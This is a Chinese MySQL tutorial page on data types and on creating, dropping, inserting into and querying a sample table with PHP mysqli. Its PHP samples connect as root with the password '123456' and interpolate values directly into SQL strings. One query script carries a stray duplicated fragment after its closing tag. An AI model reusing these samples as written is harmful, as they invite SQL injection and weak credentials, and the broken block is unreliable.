数据类型"></a>MySQL 数据类型</h4><p>MySQL 中定义数据字段的类型对你数据库的优化是非常重要的。</p><p>MySQL 支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</p><h5 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h5><p>MySQL 支持所有标准 SQL 数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持 MyISAM、MEMORY、InnoDB 和 BDB表。</p><p>作为 SQL 标准的扩展，MySQL 也支持整数类型 TINYINT、MEDIUMINT 和 BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h5 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h5><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p><p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01/9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’/‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901/2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYYMMDD HHMMSS</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h5 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h5><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><p><strong>注意</strong>：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p><p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p><p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p><h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><p>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl(</span><br><span class="line">   -&gt; runoob_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   -&gt; runoob_title VARCHAR(100) NOT NULL,</span><br><span class="line">   -&gt; runoob_author VARCHAR(40) NOT NULL,</span><br><span class="line">   -&gt; submission_date DATE,</span><br><span class="line">   -&gt; PRIMARY KEY ( runoob_id )</span><br><span class="line">   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br><span class="line">###########</span><br><span class="line">注意：MySQL命令终止符为分号 ; 。</span><br><span class="line">注意： -&gt; 是换行符标识，不要复制。</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;CREATE TABLE runoob_tbl( &quot;.</span><br><span class="line">        &quot;runoob_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;runoob_title VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;runoob_author VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; &quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;数据表创建失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><p><code>DROP TABLE table_name ;</code></p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;DROP TABLE runoob_tbl&quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;数据表删除失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p password;</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl </span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#x27;2016-05-06&#x27;);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="读取数据表："><a href="#读取数据表：" class="headerlink" title="读取数据表："></a>读取数据表：</h4><p>select * from runoob_tbl;</p><p>脚本插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$runoob_title = &#x27;学习 Python&#x27;;</span><br><span class="line">$runoob_author = &#x27;RUNOOB.COM&#x27;;</span><br><span class="line">$submission_date = &#x27;2016-03-06&#x27;;</span><br><span class="line"> </span><br><span class="line">$sql = &quot;INSERT INTO runoob_tbl &quot;.</span><br><span class="line">        &quot;(runoob_title,runoob_author, submission_date) &quot;.</span><br><span class="line">        &quot;VALUES &quot;.</span><br><span class="line">        &quot;(&#x27;$runoob_title&#x27;,&#x27;$runoob_author&#x27;,&#x27;$submission_date&#x27;)&quot;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;无法插入数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h4><p>脚本查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;   &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="%7Bfilename%7D/image-20211227140317929.png" alt="image-20211227140317929"></p><p> 使用mysqli_fetch_assoc()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost:3306&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_assoc 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_assoc($retval))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>实例使用 <strong>MYSQLI_NUM</strong> 参数显示数据表 runoob_tbl 的所有记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost:3306&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_NUM))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[0]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[1]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[2]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[3]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>内存释放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h4><p>SQL SELECT 语句来读取数据。</p><p>有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句</p><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN FROM table_name1, table_name2...</span><br><span class="line">[WHERE condition1 [AND [OR]] condition2.....</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li><li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li></ul><p>以下为操作符列表，可用于 WHERE 子句中。</p><p>下表中实例假定 A 为 10, B 为 20</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等号，检测两个值是否相等，如果相等返回true</td><td align="left">(A = B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !=</td><td align="left">不等于，检测两个值是否相等，如果不相等返回true</td><td align="left">(A != B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 